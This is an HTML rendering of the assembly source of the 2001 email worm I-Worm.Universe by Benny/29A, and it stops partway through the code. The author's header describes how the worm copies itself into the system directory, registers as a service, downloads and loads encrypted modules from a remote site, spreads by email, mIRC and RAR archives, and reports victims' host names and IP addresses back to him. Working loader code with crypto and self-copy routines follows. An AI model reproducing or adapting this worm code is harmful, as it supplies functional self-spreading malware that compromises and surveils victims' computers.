<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Unis.a - universe.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                          ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                          ³    I-Worm.Universe    ³</span><span class="sc0">
</span><span class="sc1">;                          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                             ³  by Benny/29A  ³</span><span class="sc0">
</span><span class="sc1">;                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;When I finished my last I-Worm.XTC I had my head full of new ideaz. My most</span><span class="sc0">
</span><span class="sc1">;favourite idea was the fully modular/complementar worm, where the primary part</span><span class="sc0">
</span><span class="sc1">;of the worm would not contain any action routine, it should only download all</span><span class="sc0">
</span><span class="sc1">;available worm modulez/plug-inz from Internet, which should do the rest (very</span><span class="sc0">
</span><span class="sc1">;similar idea was described at 29A#4 in my article about InterProcess</span><span class="sc0">
</span><span class="sc1">;Communication) - one part of worm means nothing, but all parts together makes</span><span class="sc0">
</span><span class="sc1">;one functional worm.</span><span class="sc0">
</span><span class="sc1">;I also wanted such modulez to be easily controlable/upgradable, that for case</span><span class="sc0">
</span><span class="sc1">;of easilly changing of worm behaviour. And that's already done.</span><span class="sc0">
</span><span class="sc1">;In the case the worm would become spreaded there's nothing easier than release</span><span class="sc0">
</span><span class="sc1">;new module/plug-in which will destroy all partz of the worm. Or another module</span><span class="sc0">
</span><span class="sc1">;which will use computer performance of infected machinez for instance for</span><span class="sc0">
</span><span class="sc1">;cracking passwordz etc... Abilitiez are limited only by my fantasy.</span><span class="sc0">
</span><span class="sc1">;The worm can be also used for "better" purposes than spreading itself. I can</span><span class="sc0">
</span><span class="sc1">;just remove spreading module, create some backdoor module and I have fully</span><span class="sc0">
</span><span class="sc1">;functional remote-administration program. The biggest advantage of such worm</span><span class="sc0">
</span><span class="sc1">;is variability...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³ Technical details of modulez ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Each module is encrypted/compressed by "tElock" utility, like I-Worm.Energy</span><span class="sc0">
</span><span class="sc1">;and I-Worm.XTC. Primary module is in fact one EXE file containing standard</span><span class="sc0">
</span><span class="sc1">;icon of DLLz, all other modulez are heavilly encrypted DLLz (using RSA alike</span><span class="sc0">
</span><span class="sc1">;crypto algorithm). Everything is coded in assembler, ofcoz :-)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Primary module:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The algorithm of the main (primary) module is very easy. The idea was that</span><span class="sc0">
</span><span class="sc1">;this module should do only the most necessary thingz and the rest should be up</span><span class="sc0">
</span><span class="sc1">;to other onez... the algo goes here:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;1) Module will copy itself to system directory under msvbvm60.exe name,</span><span class="sc0">
</span><span class="sc1">;   execute itself there and register itself as service process, algorithm</span><span class="sc0">
</span><span class="sc1">;   is similar to Energy and XTC.</span><span class="sc0">
</span><span class="sc1">;2) Download the list of all available modulez from</span><span class="sc0">
</span><span class="sc1">;   http://shadowvx.com/benny/viruses/mod.txt.</span><span class="sc0">
</span><span class="sc1">;3) Download all modulez from addresses specified in the list, decrypt them</span><span class="sc0">
</span><span class="sc1">;   (RSA algo) and save them to system directory under msvbvm6(a-z).dll</span><span class="sc0">
</span><span class="sc1">;   filenamez.</span><span class="sc0">
</span><span class="sc1">;4) Load those DLLz to its address space. By windows API will be activated</span><span class="sc0">
</span><span class="sc1">;   all initialization routinez, which will execute the code inside modulez.</span><span class="sc0">
</span><span class="sc1">;5) Wait random time, simulate fork and jump to 1) step, like Energy and</span><span class="sc0">
</span><span class="sc1">;   XTC.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Module for mail spreading:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This module will after activation search inside all *.*htm* filez in "Temporary</span><span class="sc0">
</span><span class="sc1">;Internet Files" for mail addresses and send there the main module. It will not</span><span class="sc0">
</span><span class="sc1">;send the main module stored in system directory, but the one stored inside</span><span class="sc0">
</span><span class="sc1">;itself. So if this module will contain newer version of main module, it will</span><span class="sc0">
</span><span class="sc1">;update itself on remote computer.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Payload module:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;In dependency on system counter, it will redirect all URLs in MSIE to</span><span class="sc0">
</span><span class="sc1">;http://www.therainforestsite.com, such like I-Worm.XTC.</span><span class="sc0">
</span><span class="sc1">;And again, in dependency on system counter it will download bitmap from</span><span class="sc0">
</span><span class="sc1">;http://shadowvx.com/benny/viruses/universe.jpg, save it to system directory</span><span class="sc0">
</span><span class="sc1">;and set it as standard wallpaper. I like this one :-)</span><span class="sc0">
</span><span class="sc1">;And at last, in dependency on system counter it will display random garbage</span><span class="sc0">
</span><span class="sc1">;on the screen (in infinite loop) - in green &amp; black colorz.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Module for worm feedback:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This module will send the feedback to my mail address at benny_29a@hushmail.com.</span><span class="sc0">
</span><span class="sc1">;Inside the mail message is stored the host name and IP address. When it will</span><span class="sc0">
</span><span class="sc1">;finish, it will modify registry as "already-sent" mark, so it won't disturb me</span><span class="sc0">
</span><span class="sc1">;with thousandz mailz from one machine :-)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Module for mIRC spreading:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This module will check if c:\mirc\mirc32.exe exists, and if so, it will create</span><span class="sc0">
</span><span class="sc1">;c:\mirc\script.ini containing script which will send the main module to all</span><span class="sc0">
</span><span class="sc1">;ppl present on IRC channel.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Module for spreading inside RAR archivez:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This module will infect all RAR archivez stored in standard Download directory</span><span class="sc0">
</span><span class="sc1">;of MSIE by adding SETUP.EXE respresenting the main module.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³ Problemz with AVP ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc1">;Since I released this worm, second day AVP released its "funny" description. It</span><span class="sc0">
</span><span class="sc1">;informed that Universe has many bugz, however, I was able to find only ONE bug</span><span class="sc0">
</span><span class="sc1">;- when I tested it everything was Ok, but in last compilation I forgot to ZIP</span><span class="sc0">
</span><span class="sc1">;the main module - I corrected this bug in a minute and modified buggy module on</span><span class="sc0">
</span><span class="sc1">;internet. Funny thing is that they described only 5 modulez and they forgot to</span><span class="sc0">
</span><span class="sc1">;describe the last one :-) Well, its a big advantage of virusez/wormz with modular</span><span class="sc0">
</span><span class="sc1">;architecture. After hour or two, my website at www.hyperlink.cz was closed by</span><span class="sc0">
</span><span class="sc1">;provider. I wrote a mail to provider describing the situation that I DON'T spread</span><span class="sc0">
</span><span class="sc1">;viruses, that I haven't crossed any law or their rulez. I asked them if it's</span><span class="sc0">
</span><span class="sc1">;possible to close someone's website only becoz of one private software company</span><span class="sc0">
</span><span class="sc1">;that earns money by lieing to ppl's eyes. They were not able to reply me becoz</span><span class="sc0">
</span><span class="sc1">;AVP caused also closure of my mail address "benny_29a@hushmail.com". I sent</span><span class="sc0">
</span><span class="sc1">;mail to hushmail.com with similar very polite content and I still haven't</span><span class="sc0">
</span><span class="sc1">;recieved any mail from them. And it seemz I won't ever do. Funny, eh?</span><span class="sc0">
</span><span class="sc1">;Nowadayz my homepage should be placed at www.shadowvx.com and my old e-mail</span><span class="sc0">
</span><span class="sc1">;address "benny@post.cz" should also work. KasperPig showed his lameness again.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³ Last notez ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;While I was coding this worm, I had really fun... It was very nice to sit and</span><span class="sc0">
</span><span class="sc1">;watch my growing babe. I really wanted to publish it in 29A#5, but becoz of</span><span class="sc0">
</span><span class="sc1">;my problemz with inet connection and lack of time I was not able to finish it</span><span class="sc0">
</span><span class="sc1">;in december. However, I'm sure you don't mind :-)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                                  # Benny / 29A ÀÄ¿</span><span class="sc0">
</span><span class="sc1">;                                                  @ benny@post.cz ÀÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;(c) January, 2001                                 @ http://benny29a.cjb.net ³</span><span class="sc0">
</span><span class="sc1">;Czech Republic                                    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">



</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">


</span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">api</span><span class="sc0">                 </span><span class="sc1">;macro for API callz</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">api</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">                </span><span class="sc1">;declare API</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">api</span><span class="sc0">                 </span><span class="sc1">;call it...</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc5">signature</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'[I-Worm.Universe] by Benny/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                            </span><span class="sc1">;little signature ;-)</span><span class="sc0">
    </span><span class="sc5">ckey_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">key.inc</span><span class="sc0">                 </span><span class="sc1">;rsa simple key</span><span class="sc0">
    </span><span class="sc5">ckey_end</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">ckeypp_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">key_pp.inc</span><span class="sc0">              </span><span class="sc1">;rsa private/public key</span><span class="sc0">
    </span><span class="sc5">ckeypp_end</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;pair</span><span class="sc0">

    </span><span class="sc5">mod_buffer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;buffer for list of modulez</span><span class="sc0">
    </span><span class="sc5">wormname</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;primary worm filename</span><span class="sc0">
    </span><span class="sc5">wormname2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;secondary worm filename</span><span class="sc0">
    </span><span class="sc5">temppath</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;temporary buffer</span><span class="sc0">
    </span><span class="sc5">cProvider</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;handle of cryptographic provider</span><span class="sc0">
    </span><span class="sc5">cKey_pp</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;handle to priv/pub. key pair</span><span class="sc0">
    </span><span class="sc5">cKey</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;handle to simple key</span><span class="sc0">
    </span><span class="sc5">tmp</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;for misc. usage</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                           </span><span class="sc1">;worm code starts here</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_worm</span><span class="sc4">&gt;</span><span class="sc0">          </span><span class="sc1">;setup SEH frame</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10000</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc0">                   </span><span class="sc1">;wait 10 secondz</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetErrorMode</span><span class="sc0">                </span><span class="sc1">;disable error messagez</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Universe</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cProvider</span><span class="sc0">            </span><span class="sc1">;delete previously used</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CryptAcquireContextA</span><span class="sc0">            </span><span class="sc1">;crypto record</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Universe</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cProvider</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CryptAcquireContextA</span><span class="sc0">            </span><span class="sc1">;create new one</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_worm</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cKey_pp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ckeypp_end</span><span class="sc4">-</span><span class="sc5">ckeypp_start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ckeypp_start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">cProvider</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;import public/private</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CryptImportKey</span><span class="sc0">              </span><span class="sc1">;key pair</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_worm</span><span class="sc0">                </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cKey_pp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">cProvider</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CryptGetUserKey</span><span class="sc0">             </span><span class="sc1">;get handle to that</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cKey</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">cKey_pp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ckey_end</span><span class="sc4">-</span><span class="sc5">ckey_start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ckey_start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">cProvider</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;import simple key</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CryptImportKey</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">con_crypt</span><span class="sc0">               </span><span class="sc1">;quit if error</span><span class="sc0">

</span><span class="sc5">end_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">con_crypt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wormname2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">          </span><span class="sc1">;get worm filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wormname2_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;save the size</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SVCRegister</span><span class="sc0">             </span><span class="sc1">;register as service</span><span class="sc0">
</span><span class="sc5">e_svc</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;process</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HideWorm</span><span class="sc0">                </span><span class="sc1">;create worm-service</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetCommandLineA</span><span class="sc0">             </span><span class="sc1">;get ptr to command line</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;to EDI</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">l_gca</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">p_copy</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">l_gca</span><span class="sc0">                   </span><span class="sc1">;skip from filename</span><span class="sc0">

</span><span class="sc5">l_par</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">;skip from parameterz </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">l_par</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">p_copy</span><span class="sc0">                  </span><span class="sc1">;no parameterz</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;yep, parameter present,</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;worm already copied,</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">DeleteFileA</span><span class="sc0">             </span><span class="sc1">;delete the first copy</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">DownloadModules</span><span class="sc0">              </span><span class="sc1">;download all modulez</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetTickCount</span><span class="sc0">                </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">60000</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;normalize to 0..5 minutez</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc0">                   </span><span class="sc1">;wait random time long</span><span class="sc0">

</span><span class="sc5">p_copy</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyWorm</span><span class="sc0">                </span><span class="sc1">;copy the worm to another</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_worm</span><span class="sc0">                </span><span class="sc1">;file in system directory</span><span class="sc0">


</span><span class="sc1">;this procedure can copy the worm file to system directory of Windows and</span><span class="sc0">
</span><span class="sc1">;execute it</span><span class="sc0">
</span><span class="sc5">CopyWorm</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wormname</span><span class="sc0">         </span><span class="sc1">;copy the filename to</span><span class="sc0">
    </span><span class="sc5">@copysz</span><span class="sc0">                     </span><span class="sc1">;buffer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temppath</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">         </span><span class="sc1">;get system directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">'vsm\'
